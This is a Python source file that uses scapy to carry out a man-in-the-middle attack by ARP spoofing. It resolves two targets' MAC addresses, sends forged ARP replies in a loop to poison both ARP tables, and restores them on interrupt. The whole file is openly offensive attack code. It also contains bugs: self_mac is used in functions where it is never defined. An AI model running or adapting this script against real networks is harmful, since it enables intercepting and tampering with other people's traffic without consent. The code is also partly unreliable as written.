# Developer: Netanel-Arkash
# date: 12/02/2024
# purpose: This module is invoking MITM attack via ARP spoofing

from scapy.all import Ether, ARP, srp, send, sendp
import time


def get_mac(ip):
    """Returns the MAC address of IP"""
    ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0) # Default arp type is request

    if ans:
        return ans[0][1].src
    else:
        print("No ARP response")
        


def spoof(target_ip, target_mac, mask_ip, spoof_mac):
    """Crafting spoofed ARP reply. mask_ip entry in the ARP table of the target, will have the attacker's mac translation """

    # crafting an ARP 'is-at' operation packet (ARP response)
    arp_response = Ether(src=self_mac, dst=target_mac)/ARP(psrc=mask_ip, hwsrc=self_mac, pdst=target_ip, hwdst=target_mac, op=2)
    return arp_response


def restore(target_ip, target_mac, original_ip, original_mac, verbose=True):
    """Restores the original state of the ARP after the attack"""

    arp_respond = Ether(src=self_mac, dst=target_mac)/ARP(hwdst=target_mac, psrc=original_ip, hwsrc=original_mac, op=2)
    
    # Network broadcast
    sendp(arp_respond, verbose=0)

    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, original_ip, original_mac))


def main():
    self_mac = ARP().hwsrc
    targetA_ip = input("Enter the first target's ip ")
    targetB_ip = input("Enter the second target's ip ")
    targetA_mac = get_mac(targetA_ip)
    targetB_mac = get_mac(targetB_ip)
    # enable_linux_forwarding()

    try:
        targetA_spoof = spoof(targetA_ip, targetA_mac, targetB_ip, targetB_mac)
        targetB_spoof = spoof(targetB_ip, targetB_mac, targetA_ip, targetA_mac)

        while True:
            sendp(targetA_spoof, verbose=0)
            sendp(targetB_spoof, verbose=0)
            # print("[+] Sent to {} : {} is-at {}".format(targetA_ip, targetB_ip, ARP().hwsrc))
            # print("[+] Sent to {} : {} is-at {}".format(targetB_ip, targetA_ip, ARP().hwsrc))
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        time.sleep(2)
        restore(targetA_ip, targetA_mac, targetB_ip, targetB_mac)
        restore(targetB_ip, targetB_mac, targetA_ip, targetA_mac)
        # disable_linux_forwarding()


if __name__ == "__main__":
    main()
